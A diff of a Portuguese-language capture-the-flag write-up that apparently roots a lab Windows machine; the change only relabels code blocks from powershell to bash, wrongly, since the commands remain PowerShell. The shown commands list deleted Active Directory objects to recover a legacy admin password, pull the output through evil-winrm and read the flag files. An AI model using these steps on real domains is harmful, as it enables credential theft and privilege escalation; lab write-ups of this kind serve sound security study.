@@ -341,13 +341,13 @@ A ultima fase para escalar privilégios até administrador é a seguinte: Este u
 
 Para reaver todos os objectos removidos, basta uma linha de comando...
 
-```powershell
+```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
 
 Á resposta deste comando nesta máquina não é muito grande... mas normalmente é enorme. Por isso, recomendo exportar para um ficheiro, fazer o download deste para a nossa maquina, e fazer um grep por "**LegacyPwd e CanonicalName**"
 ´
-```powershell
+```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties * > output.txt
 # Pelo evil-winrm, é possível fazer donwload e upload directamente com a ferramenta:
 download "C:/Users/arksvc/Documents/output.txt"
@@ -379,7 +379,7 @@ Esta password era do usuário TempAdmin, mas o ficheiro html nos indicava que es
 
 Está feito! Somos donos da máquina...
 
-```powershell
+```bash
 cmd /c 'dir /r /s root.txt user.txt 2>NUL'
 
 (type C:\Users\Administrator\Desktop\root.txt).SubString(0,15)
